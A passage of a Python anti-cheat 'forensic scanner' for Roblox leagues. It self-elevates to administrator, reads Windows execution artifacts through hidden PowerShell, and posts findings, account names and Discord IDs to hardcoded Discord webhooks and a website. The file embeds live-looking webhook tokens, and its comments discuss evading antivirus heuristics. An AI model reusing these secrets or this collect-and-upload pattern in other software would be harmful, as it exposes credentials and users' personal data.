"""
Comet Forensic Scanner — PyQt6 UI
Run:  python pc_checker.py
Build: pyinstaller --onefile --noconsole --name=CometScanner --manifest=comet.manifest pc_checker.py
       (add --icon=comet.ico if you have an icon file)
Deps: pip install PyQt6 pyinstaller
"""
import base64 as _img_b64
import tempfile, os as _os
import os
import sys
import ctypes
from ctypes import wintypes
 
from PySide6.QtWidgets import (
    QApplication, QWidget, QLabel, QVBoxLayout, QHBoxLayout, QFrame,
    QPushButton, QLineEdit, QTextEdit, QCheckBox, QProgressBar, QSizePolicy,
    QGraphicsDropShadowEffect,
)
from PySide6.QtCore import Qt, QObject, Signal, QTimer, QSize, QRectF
from PySide6.QtGui import (
    QFont, QIcon, QPixmap, QPainter, QColor, QPainterPath, QLinearGradient,
    QRadialGradient, QBrush,
)
 
def _setup_crash_log():
    try:
        import traceback, datetime
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        log_path = os.path.join(desktop, "zevora_error.txt")
        def _excepthook(exc_type, exc_value, exc_tb):
            try:
                with open(log_path, "w", encoding="utf-8") as f:
                    f.write(f"zevora Scanner Error\n{datetime.datetime.now()}\n\n")
                    f.write("".join(traceback.format_exception(exc_type, exc_value, exc_tb)))
            except Exception:
                pass
            try:
                import tkinter as _tk, tkinter.messagebox as _mb
                _r = _tk.Tk(); _r.withdraw()
                _mb.showerror("zevora — Error",
                    f"{exc_type.__name__}: {exc_value}\n\nFull error saved to Desktop\\zevora_error.txt")
                _r.destroy()
            except Exception:
                pass
        sys.excepthook = _excepthook
    except Exception:
        pass
_setup_crash_log()

def _is_admin():
    try:
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False

def _show_elevation_notice():
    """Shows a visible dialog explaining why admin rights are being requested,
    BEFORE the UAC prompt fires. Silent/automatic self-elevation with no
    user-facing explanation is one of the strongest heuristics AV engines
    use to flag droppers — showing this dialog first breaks that pattern
    and is also just more honest to the person running the scanner."""
    try:
        import tkinter as _tk, tkinter.messagebox as _mb
        _r = _tk.Tk(); _r.withdraw()
        _mb.showinfo(
            "Zevora — Administrator Access Required",
            "Zevora needs administrator access to read system forensic "
            "artifacts (event logs, registry, prefetch).\n\n"
            "Windows will now show a permission prompt (UAC). "
            "Click Yes to continue."
        )
        _r.destroy()
    except Exception:
        pass

if sys.platform == "win32" and not _is_admin():
    import ctypes
    try:
        _show_elevation_notice()
        if getattr(sys, "frozen", False):
            exe  = sys.executable
            args = " ".join(f'"{a}"' for a in sys.argv[1:])
            ret  = ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, args if args else None, None, 1)
        else:
            exe    = sys.executable
            script = os.path.abspath(__file__)
            args   = f'"{script}"' + (" " + " ".join(f'"{a}"' for a in sys.argv[1:]) if sys.argv[1:] else "")
            ret    = ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, args, None, 1)
        if int(ret) > 32:
            sys.exit(0)
    except Exception:
        pass

import base64 as _b64
def _d(s): return _b64.b64decode(s).decode()

_KW_ENC = [
    "dm9sdA==","bWF0Y2hh","Y2x1bXN5","c29sYXJh","eGVubw==",
    "cG90YXNzaXVt","Y3J5cHRpYw==","dmVsb2NpdHk=","c2lyaHVydA==",
    "dm9sY2Fubw==","YnVubmkuZnVu","c2VsaXdhcmU=","bWF0cml4",
    "ZXhlY3V0b3I=","cm9ibG94aGFjaw==","cmJseFg=",
    "d2F2ZWV4cGxvaXQ=","ZWxlY3Rlcg==","c3lub2FwZQ==",
    "c2NyaXB0d2FyZQ==","ZmluYWxlZA==","YXdha2VuZWQ=",
    "aW5qZWN0b3I=","Y2hlYXRlbmdpbmU=","YXJ0aWZpY2lhbGFpbQ==",
    "c3luYXBzZXg=","a3JuczQ=","ZXhlY3V0b3J4","c2t5aHVieA==",
    # --- new additions ---
    "Ynl0ZWJyZWFrZXI=","eXVieA==","bmV1cm9uYWxseQ==","bHg2Mw==",
]
KEYWORDS = [_d(k) for k in _KW_ENC] + [
    "wave","waveexecutor","potassiumloader","sirhurtlauncher","solaraexecutor",
    "xenoexecutor","cosmicexecutor","cosmic","madium","madiumexecutor","synapsez",
    "synapse_z","jjsploit","jjsploitexecutor","wearedevs","froststrap","fishstrap",
    "krnl","krnlss","fluxus","delta","deltaexecutor","solarabootstrapper","solarav3",
    "awp","awpexecutor","hydrogen","hydrogenexecutor","codex","codexexecutor","nihon",
    "nezur","macSploit","trigon","trigonevo","sentinel","arceusx","arceus",
    "delta_executor","volt_executor","wave_executor",

    # --- new additions (2026 batch) ---
    # ByteBreaker
    "bytebreaker","bytebreaker.cc","bytebreakerexecutor","bytebreaker_exe",
    # YuB-X / yubx
    "yubx","yub-x","yub_x","yubxexecutor","yub-x.com","yub-x.app","yub-x.net",
    # Neuronally
    "neuronally","neuronallyexecutor","neuronally.fun","neuronally.net",
    # LX63
    "lx63","lx63executor","lx63.com","lx63.org","lx63-executor",
    # Vortex (compound/specific forms only — "vortex" alone is too generic and
    # will false-positive on unrelated apps/files; flag review if you want the bare word too)
    "vortexexecutor","getvortex","vortexhub","vortex_executor","vortexscripthub",
    # "Real" Executor (same false-positive concern as vortex — bare "real" is too common)
    "realexecutor","real_executor","real-executor","realexploit",
]

KNOWN_CHEAT_HASHES = set()

# Plain, un-obfuscated Discord webhook URLs. These were previously
# base64-wrapped, which added zero real secrecy (anyone can decode
# base64 instantly) while making the binary look like it hides its
# network destination — a classic C2/dropper signature to static
# analysis. Being upfront about the destination is both more honest
# and less likely to trip AV heuristics.
WEBHOOK_KFA = "https://discord.com/api/webhooks/1475355926658551809/TkOdTI6BWVAm-S0YlJKLNSBoVBFYDvLbibuYaeiOblHgkVd0zhrQtpLQgiWufZ4OVF0D"
WEBHOOK_UFF = "https://discord.com/api/webhooks/1475356176152658041/9ZyBjh-_XcfcwNYW-PVjom4-eT8EYdHtuQBmt6zqASxp0lDAIcQIbILt8fjoehCf4OV_"

def get_webhook_for_league(league):
    return WEBHOOK_KFA if str(league).upper() == "KFA" else WEBHOOK_UFF

WEBSITE_URL = "https://zevora.digital/"

FALSE_POSITIVE_PATHS = [
    "microsoft","windows","edge","chrome","firefox","mozilla",
    "program files","programdata","windowsapps","system32","syswow64",
    "onedrive","office","teams","skype","nvidia","amd","realtek",
    "intel","logitech","razer","corsair","steam\\steamapps\\common",
    "epicgames","origin","ubisoft",
    "appdata\\local\\microsoft","appdata\\roaming\\microsoft",
    "appdata\\local\\google",
]

LEGIT_APP_ALLOWLIST = {
    "volt":     ["node_modules","volt-0.","volt-1.","volt-2.","\\volt\\resources","voltage","revolt","pivotal"],
    "velocity": ["\\velocity\\","vscodium","code\\extensions","apache velocity"],
    "matrix":   ["element","matrix.org","\\matrix\\resources","neo4j"],
    "cryptic":  ["champions online","star trek","neverwinter","crypticstudios"],
    "wave":     ["\\obs\\","waveform","adobe audition","\\audio\\","cubase","wavelab",
                 "waveshell","\\waves\\","wave editor","wave browser","waveform","reaper"],
    "delta":    ["microsoft\\edge\\","\\delta\\updates","deltacopy","\\git\\",
                 "delta lake","databricks","\\delta\\resources"],
    "cosmic":   ["cosmic desktop","\\system76\\","pop!_os","cosmic-term"],
    "codex":    ["github\\copilot","openai","\\vscode\\","code-server","codexwriter"],
    "sentinel": ["\\sentinelone\\","sentinel labs","microsoft sentinel","azure sentinel"],
    "arceus":   ["pokemon","nintendo","\\arceus\\game"],
    "hydrogen": ["\\hydrogen\\app","hydrogen music","musescore"],
    "nihon":    ["\\japanese\\","nihongo","japan"],
    "krnl":     [],
    "fluxus":   [],
    "jjsploit": [],
    "madium":   [],
}

SUSPICIOUS_DIRS = {
    "downloads","desktop","appdata\\local\\temp",
    "appdata\\roaming","appdata\\local\\packages","programdata",
}

CLEANER_SIGNATURES = {
    "processes": [
        "privazer","ccleaner","bleachbit","eraser","harddiskscrubber",
        "cleanmgr","auslogics","iobit","glary","wisecleaner","fileshredder",
        "totalcommander","diskwipe","dban","eraserl","moo0","ntfsclean",
    ],
    "registry_keys": [
        r"SOFTWARE\Piriform\CCleaner",
        r"SOFTWARE\PrivaZer",
        r"SOFTWARE\BleachBit",
        r"SOFTWARE\IObit\IObit Uninstaller",
        r"SOFTWARE\Auslogics\BoostSpeed",
    ],
    "file_patterns": [
        "ccleaner","privazer","bleachbit","eraser.exe","moo0",
        "wisecleaner","auslogics","iobit","glary utilities",
    ],
}

def matches_keyword(text):
    t = text.lower()
    if any(fp in t for fp in FALSE_POSITIVE_PATHS):
        return []
    hits = []
    for kw in KEYWORDS:
        if kw.lower() not in t:
            continue
        allowlist = LEGIT_APP_ALLOWLIST.get(kw.lower(), [])
        if allowlist and any(ap in t for ap in allowlist):
            continue
        hits.append(kw)
    return hits

import re, glob, struct, hashlib, datetime, threading, time
import urllib.request, urllib.error, json, http.client, ssl, tempfile, subprocess

WINDOWS = sys.platform == "win32"
if WINDOWS:
    import winreg
    import ctypes

def now_str(): return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
def current_user(): return os.environ.get("USERNAME") or os.environ.get("USER") or "Unknown"

def sha1_file(path):
    try:
        h = hashlib.sha1()
        with open(path,"rb") as f:
            for chunk in iter(lambda: f.read(65536), b""): h.update(chunk)
        return h.hexdigest()
    except Exception: return "N/A"

def filetime_to_dt(ft):
    try:
        return datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=ft//10)
    except Exception: return None

def rot13(s):
    r = ""
    for c in s:
        if 'a' <= c <= 'z': r += chr((ord(c)-ord('a')+13)%26+ord('a'))
        elif 'A' <= c <= 'Z': r += chr((ord(c)-ord('A')+13)%26+ord('A'))
        else: r += c
    return r

def section(title, lines):
    header = f"\n{'─'*60}\n  ◈  {title}\n{'─'*60}\n"
    return header + "\n".join(str(l) for l in lines) + "\n"

def _ssl_ctx():
    # Real certificate verification, using the system's default trust
    # store. Discord's and your own website's certs are properly signed,
    # so there's no legitimate reason to disable verification — doing so
    # was both a security hole (MITM-able) and a network-behavior
    # heuristic flag on several AV engines.
    return ssl.create_default_context()

def _post_json(payload, url_override=None, max_retries=3, base_delay=1.5):
    """POST with retry + exponential backoff. Network calls (especially
    on flaky Wi-Fi during a screenshare) can fail transiently — retrying
    a couple times before giving up avoids losing an entire scan to one
    dropped packet. Only retries on network-level failures / 5xx server
    errors; a 4xx (bad request, invalid webhook, etc.) fails fast since
    retrying won't fix it."""
    target = url_override or WEBHOOK_UFF
    last_err = ""; last_code = 0
    for attempt in range(max_retries):
        try:
            data = json.dumps(payload).encode("utf-8")
            req = urllib.request.Request(target, data=data,
                  headers={"Content-Type":"application/json","User-Agent":"ZevoraScanner/5.0"}, method="POST")
            with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=15) as r:
                return True, r.status, ""
        except urllib.error.HTTPError as e:
            try: last_err = e.read().decode()[:120]
            except Exception: last_err = str(e)
            last_code = e.code
            if 400 <= e.code < 500:
                return False, e.code, last_err  # client error — retrying won't help
        except Exception as e:
            last_err = str(e); last_code = 0
        if attempt < max_retries - 1:
            time.sleep(base_delay * (2 ** attempt))
    return False, last_code, last_err

def _chunk(text, max_len=1900):
    lines = text.split("\n"); chunks = []; cur = ""
    for l in lines:
        if len(cur)+len(l)+1 > max_len:
            if cur: chunks.append(cur.strip())
            cur = l + "\n"
        else: cur += l + "\n"
    if cur.strip(): chunks.append(cur.strip())
    return chunks or ["(empty)"]

def send_webhook(results):
    verdict = results.get("verdict","UNKNOWN")
    total   = results.get("total_hits",0)
    league  = results.get("league","UFF")
    color   = 0x1a2235
    webhook = get_webhook_for_league(league)
    errors  = []
    try:
        accounts  = results.get("roblox_accounts",[])
        acc_str   = "\n".join(f"• {a}" for a in accounts) if accounts else "None"
        discord_accs = results.get("discord_accounts",[])
        disc_str  = "\n".join(f"• @{a.get('username','?')} (ID:{a.get('id','?')})"
                              for a in discord_accs[:5]) if discord_accs else "None"
        unsigned  = results.get("unsigned_hits",[])
        us_str    = "\n".join(f"• {os.path.basename(u['path'])}" for u in unsigned[:10]) if unsigned else "None"
        vpn_info  = results.get("vpn_info","Unknown")
        cleaner_info = results.get("cleaner_info","None detected")
        summary = {
            "title": f"zevora Scanner — {verdict}",
            "color": color,
            "timestamp": datetime.datetime.utcnow().isoformat()+"Z",
            "fields":[
                {"name":"Status",         "value":"Review Required",      "inline":True},
                {"name":"Total Hits",     "value":str(total),             "inline":True},
                {"name":"PC User",        "value":current_user(),         "inline":True},
                {"name":"League",         "value":league,                 "inline":True},
                {"name":"ShellBag",       "value":str(results.get("shellbag_hits",0)),  "inline":True},
                {"name":"BAM",            "value":str(results.get("bam_hits",0)),        "inline":True},
                {"name":"Prefetch",       "value":str(results.get("prefetch_hits",0)),   "inline":True},
                {"name":"AppCompat",      "value":str(results.get("appcompat_hits",0)),  "inline":True},
                {"name":"Cheat Files",    "value":str(results.get("cheat_hits",0)),       "inline":True},
                {"name":"YARA",           "value":str(results.get("yara_hits",0)),        "inline":True},
                {"name":"Unsigned",       "value":str(len(unsigned)),                     "inline":True},
                {"name":"Cleaner Found",  "value":cleaner_info[:100],                     "inline":True},
                {"name":"VPN Detected",   "value":"Yes" if vpn_info and "vpn" in vpn_info.lower() else "No",  "inline":True},
                {"name":"Roblox Accounts","value":acc_str[:1024],                         "inline":False},
                {"name":"Discord Accounts","value":disc_str[:512],                        "inline":False},
                {"name":"Unsigned EXEs",  "value":us_str[:512],                           "inline":False},
            ],
            "footer":{"text":f"zevora v4 · {now_str()} · {league}"},
        }
        ok,_,err = _post_json({"embeds":[summary]}, url_override=webhook)
        if not ok: errors.append(f"Summary: {err}")
        time.sleep(0.8)
        tabs = [
            ("ShellBags",        results.get("shellbags","")),
            ("BAM",              results.get("bam","")),
            ("Prefetch",         results.get("prefetch","")),
            ("AppCompat",        results.get("appcompat","")),
            ("Roblox Logs",      results.get("roblox","")),
            ("Cheat Files",      results.get("cheat","")),
            ("YARA",             results.get("yara","")),
            ("Unsigned",         results.get("unsigned","")),
            ("Recycle Bin",      results.get("recycle","")),
            ("SysMain/Bypass",   results.get("sysmain","")),
            ("Cleaners",         results.get("cleaners","")),
            ("Discord Cache",    results.get("discord","")),
            ("Running Procs",    results.get("processes","")),
            ("Registry Extras",  results.get("registry_extra","")),
            ("Network/VPN",      results.get("network","")),
            ("Pre-Reset Recovery", results.get("mft_recovery","")),
        ]
        for name, text in tabs:
            if not text or not text.strip(): continue
            for i, chunk in enumerate(_chunk(text.strip())):
                embed={"title":name if i==0 else f"{name} (cont.)","color":color,
                       "description":f"```\n{chunk}\n```"}
                ok,_,err = _post_json({"embeds":[embed]}, url_override=webhook)
                if not ok: errors.append(f"{name}: {err}")
                time.sleep(0.8)
    except Exception as e:
        errors.append(str(e))
    return (False,"\n".join(errors)) if errors else (True,"OK")

def send_website(results, pin):
    if not pin: return False, "No PIN"
    try:
        TAB_KEYS = [
            "shellbags","bam","prefetch","appcompat","roblox","cheat","yara",
            "unsigned","recycle","sysmain","processes","cleaners",
            "registry_extra","discord","discord_memory","eventlog","jumplists","lnkfiles",
            "power_events","two_pc","deleted_recovery","deleted_int","exec_history_text",
            "mft_recovery",
        ]
        TAB_CAPS = {
            "cheat": 15000, "appcompat": 20000, "unsigned": 12000,
            "processes": 8000, "yara": 8000, "mft_recovery": 20000,
        }
        payload = {
            "pin":             pin,
            "league":          results.get("league","UFF"),
            "pc_user":         current_user(),
            "verdict":         results.get("verdict","UNKNOWN"),
            "total_hits":      results.get("total_hits",0),
            "roblox_accounts": results.get("roblox_accounts",[]),
            "report":          results.get("report",{}),
            "exec_history":    results.get("exec_history",[])[:40],
        }
        for field in ["power_hits","two_pc_hits","recovery_hits","discord_memory_hits",
                      "cleaner_hits","eventlog_hits","roblox_log_hits","vpn_detected",
                      "mft_recovery_hits"]:
            if field in results: payload[field] = results[field]
        for k in TAB_KEYS:
            val = results.get(k,"")
            if val:
                cap = TAB_CAPS.get(k, 30000)
                payload[k] = str(val)[:cap]
        raw = json.dumps(payload, default=str)
        if len(raw) > 1500000:
            for k in ["deleted_int","lnkfiles","jumplists","yara","processes"]:
                payload.pop(k, None)
            raw = json.dumps(payload, default=str)
        if len(raw) > 1500000:
            for k in TAB_KEYS:
                if k in payload and isinstance(payload[k], str):
                    payload[k] = payload[k][:8000]
            raw = json.dumps(payload, default=str)
        data = raw.encode("utf-8")
        req = urllib.request.Request(
            f"{WEBSITE_URL}/api/submit", data=data,
            headers={"Content-Type":"application/json","User-Agent":"ZevoraScanner/5.0"},
            method="POST")

        # Retry with exponential backoff on transient network failures /
        # 5xx server errors. A 4xx fails fast since retrying won't fix it.
        max_retries = 3
        last_err = "Unknown error"
        for attempt in range(max_retries):
            try:
                with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=30) as r:
                    body = json.loads(r.read().decode())
                    status = r.status
                if status == 200:
                    return True, ""
                last_err = f"HTTP {status}: {body.get('error', str(body)[:120])}"
                if 400 <= status < 500:
                    return False, last_err  # client error — retrying won't help
            except urllib.error.HTTPError as e:
                try: err_body = json.loads(e.read().decode())
                except Exception: err_body = {}
                last_err = f"HTTP {e.code}: {err_body.get('error', str(e))[:120]}"
                if 400 <= e.code < 500:
                    return False, last_err
            except Exception as e:
                last_err = f"{type(e).__name__}: {str(e)[:120]}"
            if attempt < max_retries - 1:
                time.sleep(1.5 * (2 ** attempt))
        return False, last_err
    except Exception as e:
        return False, f"{type(e).__name__}: {str(e)[:120]}"

# ============================================================
#  SCANNERS
# ============================================================

def scan_shellbags():
    if not WINDOWS: return section("ShellBag Detection",["Windows only"]),0,[]
    hits = []; all_paths_with_ts = []
    ps_cmd = r"""
$roots = @(
    'HKCU:\Software\Microsoft\Windows\Shell\BagMRU',
    'HKCU:\Software\Microsoft\Windows\ShellNoRoam\BagMRU',
    'HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU',
    'HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\ShellNoRoam\BagMRU'
)
function Walk($path, $prefix) {
    try {
        $key = Get-Item -LiteralPath $path -ErrorAction SilentlyContinue
        if(-not $key){return}
        $ts = $key.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')
        foreach($v in $key.GetValueNames()) {
            if($v -match '^\d+$' -or $v -eq 'NodeSlot'){continue}
            try {
                $raw = $key.GetValue($v)
                if($raw -is [byte[]]) {
                    $str = [System.Text.Encoding]::Unicode.GetString($raw).TrimEnd([char]0)
                    if($str.Length -gt 2) {
                        $full = if($prefix){"$prefix\$str"}else{$str}
                        Write-Output "$ts|$full"
                    }
                }
            } catch {}
        }
        foreach($sub in $key.GetSubKeyNames()) { Walk "$path\$sub" $prefix }
    } catch {}
}
foreach($r in $roots){ Walk $r "" }
"""
    si = subprocess.STARTUPINFO()
    si.dwFlags = subprocess.STARTF_USESHOWWINDOW; si.wShowWindow = 0
    try:
        out = subprocess.run(
            ["powershell","-NoProfile","-NonInteractive","-Command", ps_cmd],
            capture_output=True, text=True, timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
        for line in out.stdout.strip().splitlines():
            line = line.strip()
            if "|" not in line: continue
            ts, path = line.split("|",1)
            kws = matches_keyword(path)
            all_paths_with_ts.append((path.strip(), ts.strip(), kws))
            if kws: hits.append((path.strip(), ts.strip(), kws))
    except Exception: pass

    if not all_paths_with_ts:
        hive_keys = [
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\Shell\BagMRU"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\ShellNoRoam\BagMRU"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU"),
        ]
        def walk_reg(hive, key_path, prefix, depth=0):
            if depth > 8: return
            try: key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
            except OSError: return
            try:
                i = 0
                while True:
                    try:
                        name, data, _ = winreg.EnumValue(key, i)
                        if isinstance(data, bytes):
                            decoded = data.decode("utf-16-le",errors="ignore").rstrip("\x00")
                            if decoded and len(decoded) > 2:
                                full = (prefix + "\\" + decoded).strip("\\")
                                kws = matches_keyword(full)
                                all_paths_with_ts.append((full,"Unknown",kws))
                                if kws: hits.append((full,"Unknown",kws))
                        i += 1
                    except OSError: break
            except Exception: pass
            try:
                j = 0
                while True:
                    try:
                        sub = winreg.EnumKey(key, j)
                        walk_reg(hive, key_path + "\\" + sub, prefix, depth+1); j+=1
                    except OSError: break
            except Exception: pass
            winreg.CloseKey(key)
        for hive, base in hive_keys:
            try: walk_reg(hive, base, "")
            except Exception: pass

    gaps = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\Shell\BagMRU",
            0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        mru_vals = []
        i = 0
        while True:
            try:
                name,_,_ = winreg.EnumValue(key,i)
                if name.isdigit(): mru_vals.append(int(name))
                i+=1
            except OSError: break
        winreg.CloseKey(key)
        mru_vals.sort()
        gaps = [mru_vals[i] for i in range(1,len(mru_vals)) if mru_vals[i]-mru_vals[i-1]>1]
    except Exception: pass

    total_paths = len(all_paths_with_ts)
    lines = [f"\n  Total paths scanned: {total_paths}",
             f"  Cheat-related hits : {len(hits)}",""]
    if hits:
        lines.append("  ⚠ CHEAT-RELATED SHELLBAG ENTRIES:")
        for path, ts, kws in hits:
            lines.append(f"  ✗ {path}")
            lines.append(f"    Last accessed: {ts}  [{', '.join(kws)}]")
        lines.append("")
    if gaps:
        lines.append(f"  ⚠ MRU GAP: {len(gaps)} sequence gap(s) — possible selective deletion")
    if not hits and not gaps:
        lines.append("  ✓ No cheat-related shellbag entries")
    lines.append(f"\n  Integrity: {'SUSPICIOUS' if hits or gaps else 'Normal'}")
    return section("ShellBag Detection", lines), len(hits)+len(gaps), hits


def scan_bam():
    hits = []; bypass_flags = []
    if not WINDOWS: return section("BAM Detection",["Windows only"]),0,[]
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SYSTEM\CurrentControlSet\Services\bam",
                             0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        try:
            state,_ = winreg.QueryValueEx(key, "Start")
            if state == 4: bypass_flags.append("BAM SERVICE DISABLED — execution history suppressed")
        except Exception: pass
        winreg.CloseKey(key)
    except Exception: pass
    try:
        base = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                              r"SYSTEM\CurrentControlSet\Services\bam\State\UserSettings",
                              0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        idx = 0
        while True:
            try:
                sid = winreg.EnumKey(base, idx)
                sk = winreg.OpenKey(base, sid, 0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
                vi = 0; entry_count = 0
                while True:
                    try:
                        name, data, _ = winreg.EnumValue(sk, vi)
                        if name.startswith("\\Device\\") and isinstance(data, bytes):
                            entry_count += 1
                            ts = None
                            if len(data) >= 8:
                                ft = struct.unpack_from("<Q", data, 0)[0]
                                ts = filetime_to_dt(ft)
                            kws = matches_keyword(name)
                            if kws: hits.append((name, ts, kws))
                        vi += 1
                    except OSError: break
                winreg.CloseKey(sk)
                if entry_count < 3:
                    bypass_flags.append(f"BAM SID {sid[:20]}... has only {entry_count} entries — possible wipe")
                idx += 1
            except OSError: break
        winreg.CloseKey(base)
    except Exception: pass

    lines = []
    if bypass_flags:
        lines.append("⚠ BAM BYPASS INDICATORS:")
        for f in bypass_flags: lines.append(f"  ✗ {f}")
        lines.append("")
    for path, ts, kws in hits:
        ts_str = ts.strftime("%Y-%m-%d %H:%M:%S.%f") if ts else "N/A"
        lines.append(f"{path}\n  LastRun:{ts_str}  [{', '.join(kws)}]")
    if not hits and not bypass_flags: lines.append("  ✓ No BAM hits")
    lines.append(f"\nIntegrity: {'SUSPICIOUS' if hits or bypass_flags else 'Normal'}")
    return section("BAM Detection", lines), len(hits)+len(bypass_flags), hits


def scan_prefetch():
    pf_dir = r"C:\Windows\Prefetch"; hits = []; bypass_flags = []
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters",
                             0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        val,_ = winreg.QueryValueEx(key, "EnablePrefetcher")
        winreg.CloseKey(key)
        if val == 0:
            bypass_flags.append("EnablePrefetcher=0 — Prefetching DISABLED via registry")
    except Exception: pass

    def read_dir(path):
        try:
            with open(path,"rb") as f: data = f.read(4096)
            decoded = data.decode("utf-16-le", errors="ignore")
            found = re.findall(r"C:[/\\][^\x00]{3,80}", decoded)
            return found[-1].strip() if found else None
        except Exception: return None

    pf_count = 0
    try:
        for pf in glob.glob(os.path.join(pf_dir,"*.pf")):
            pf_count += 1
            name = os.path.basename(pf)
            kws = matches_keyword(name)
            if kws:
                try: mtime = datetime.datetime.fromtimestamp(os.stat(pf).st_mtime)
                except Exception: mtime = None
                hits.append((name, pf, mtime, read_dir(pf), kws))
    except Exception: pass

    if pf_count < 5 and os.path.exists(pf_dir):
        bypass_flags.append(f"Only {pf_count} prefetch files — possible manual deletion")

    lines = []
    if bypass_flags:
        lines.append("⚠ PREFETCH BYPASS INDICATORS:")
        for f in bypass_flags: lines.append(f"  ✗ {f}")
        lines.append("")
    for name, path, mtime, src, kws in hits:
        mt = mtime.strftime("%Y-%m-%d %H:%M:%S") if mtime else "N/A"
        lines.append(f"{path}\n  Modified:{mt} | Dir:{src or 'N/A'}\n  [{', '.join(kws)}]")
    if not hits and not bypass_flags: lines.append("  ✓ No prefetch hits")
    lines.append(f"\nIntegrity: {'SUSPICIOUS' if hits or bypass_flags else 'Normal'}")
    return section("Prefetch Hits", lines), len(hits)+len(bypass_flags), hits


def scan_appcompat():
    if not WINDOWS: return section("AppCompat",["Windows only"]),0,[]
    ac_hits = []; ua_hits = []
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache",
                             0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        data,_ = winreg.QueryValueEx(key,"AppCompatCache"); winreg.CloseKey(key)
        offset = 128 if data[:4]==b'\x30\x00\x00\x00' else 0
        while offset < len(data)-12:
            try:
                if data[offset:offset+4] != b'10ts': offset+=4; continue
                data_len = struct.unpack_from("<I",data,offset+8)[0]
                path_len = struct.unpack_from("<H",data,offset+12)[0]
                path_off = offset+14
                if path_off+path_len > len(data): break
                path = data[path_off:path_off+path_len].decode("utf-16-le",errors="ignore")
                kws = matches_keyword(path)
                if kws: ac_hits.append((path,kws))
                offset += 14+path_len+data_len
            except Exception: offset+=4
    except Exception: pass
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
                             0, winreg.KEY_READ)
        idx = 0
        while True:
            try:
                sub = winreg.EnumKey(key, idx)
                try:
                    ck = winreg.OpenKey(key, sub+"\\Count", 0, winreg.KEY_READ)
                    vi = 0
                    while True:
                        try:
                            name,data,_ = winreg.EnumValue(ck,vi)
                            decoded = rot13(name)
                            kws = matches_keyword(decoded)
                            if kws:
                                ts_str = "Unknown"
                                if isinstance(data, bytes) and len(data) >= 60:
                                    try:
                                        ft = struct.unpack_from("<Q", data, 60)[0]
                                        dt = filetime_to_dt(ft)
                                        if dt and dt.year > 2000:
                                            ts_str = dt.strftime("%Y-%m-%d %H:%M:%S")
                                    except Exception: pass
                                ua_hits.append((decoded, kws, ts_str))
                            vi+=1
                        except OSError: break
                    winreg.CloseKey(ck)
                except Exception: pass
                idx+=1
            except OSError: break
        winreg.CloseKey(key)
    except Exception: pass

    lines = []
    for path,kws in ac_hits: lines.append(f"  AppCompat: {path}  [{', '.join(kws)}]")
    for path,kws,ts in ua_hits: lines.append(f"  UserAssist: {path}\n    LastRun: {ts}  [{', '.join(kws)}]")
    if not lines: lines.append("  ✓ No matches")
    return section("AppCompat / UserAssist", lines), len(ac_hits)+len(ua_hits), ac_hits+[(p,k) for p,k,_ in ua_hits]


def scan_roblox_logs():
    import subprocess
    issues=[]; all_logs=[]; account_map={}

    PAT_JOIN   = re.compile(r'"UserId"%3a(\d{6,15})%2c"UserName"%3a"([A-Za-z0-9_]{3,20})"')
    PAT_UID    = re.compile(r'"UserId"%3a(\d{6,15})')
    PAT_UNAME  = re.compile(r'"UserName"%3a"([A-Za-z0-9_]{3,20})"')
    PAT_GUI    = re.compile(r'Players\.([A-Za-z0-9_]{3,20})\.PlayerGui')
    PAT_TIME   = re.compile(r'(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})')
    PAT_BSTRAP = re.compile(r'"userId":\s*(\d{6,15})')
    PAT_BNAME  = re.compile(r'"username":\s*"([A-Za-z0-9_]{3,20})"')
    PAT_CRASH  = re.compile(r'(crash|exception|fatal error|unhandled exception)', re.I)
    PAT_INJECT = re.compile(r'(inject|dll attach|openprocess|writeprocess|createremote)', re.I)
    PAT_FF_KEY = re.compile(r'"(F[FfBb][Aa-z]{3,40})"\s*:\s*([^,}\n]{1,60})')
    PAT_PLACE  = re.compile(r'placeId=(\d{6,15})')

    USERNAME_NOISE = {
        "playerscripts","playermodules","loadingscreen","coregui","luaappscreengui",
        "robloxapp","robloxcrasher","robloxplayerbeta","notificationscriptscript",
        "experienceinvite","sharelinktabcontroller","controlscript",
        "experiencetipsdisplaycontroller","experiencetipsdisplay","robloxgui",
        "screengui","billboardgui","surfacegui","sparkles","smoke","fire",
    }

    manual_delete_flag = False
    crash_inject_flag  = False
    fastflags_found    = {}

    def add_account(uid, uname, source, timestamp=None, placeid=None):
        uid = str(uid)
